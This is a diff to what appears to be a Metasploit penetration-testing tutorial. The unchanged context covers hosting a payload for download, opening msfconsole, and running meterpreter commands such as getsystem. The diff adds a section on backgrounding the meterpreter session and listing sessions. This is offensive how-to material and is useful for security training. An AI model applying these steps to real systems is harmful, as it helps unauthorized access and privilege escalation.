@@ -51,7 +51,7 @@ python3 -m http.server -b <your_machine_ip> <port_number>
 ### Now download the payload you have just created. 
 
 
-## **System Exploitation & Gaining Access**
+# **System Exploitation & Gaining Access**
 
 ### Step 1: 
 Go to new terminal and use the below command to start metasploit console 
@@ -105,3 +105,18 @@ sysinfo
 ```
 getsystem 
 ```
+
+# Privilege Escalation
+
+Now we will come back to our msfconsole terminal by typing command “background” in the meterpreter terminal. This command will store our access as a background session.  
+**Command**:
+```
+background
+```
+
+We can view our session by using the command “sessions”. 
+**Command**: 
+```sessions ```
+
+
+
